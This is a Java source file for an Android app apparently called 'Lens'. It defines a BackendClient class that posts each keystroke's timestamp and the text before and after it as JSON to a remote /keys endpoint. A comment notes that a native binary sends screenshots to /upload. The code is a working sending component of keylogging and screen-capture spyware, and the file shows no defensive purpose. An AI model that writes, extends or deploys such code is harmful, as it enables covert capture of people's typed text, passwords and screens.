package com.example.lens;

import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Cliente HTTP minimalista. Solo POSTea keystrokes a /keys; las screenshots
 * las maneja el binario nativo via /upload por separado.
 */
public class BackendClient {

    private static final String TAG = "Lens";

    public interface StatusListener {
        void onStatus(String message);
    }

    private final String endpoint;
    private final StatusListener listener;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    public BackendClient(String endpoint, StatusListener listener) {
        this.endpoint = endpoint;
        this.listener = listener;
    }

    public void sendKeystroke(long timestampMs, String before, String after) {
        executor.execute(() -> {
            HttpURLConnection conn = null;
            try {
                JSONObject body = new JSONObject();
                body.put("ts", timestampMs);
                body.put("before", before);
                body.put("after", after);

                URL url = new URL(endpoint);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                conn.setConnectTimeout(2000);
                conn.setReadTimeout(2000);
                conn.setDoOutput(true);

                byte[] payload = body.toString().getBytes(StandardCharsets.UTF_8);
                try (OutputStream out = conn.getOutputStream()) {
                    out.write(payload);
                }

                int code = conn.getResponseCode();
                listener.onStatus(code >= 200 && code < 300
                        ? "OK " + code + " (" + payload.length + " B)"
                        : "HTTP " + code);
            } catch (Exception e) {
                Log.w(TAG, "send failed: " + e.getMessage());
                listener.onStatus("error: " + e.getClass().getSimpleName());
            } finally {
                if (conn != null) conn.disconnect();
            }
        });
    }
}
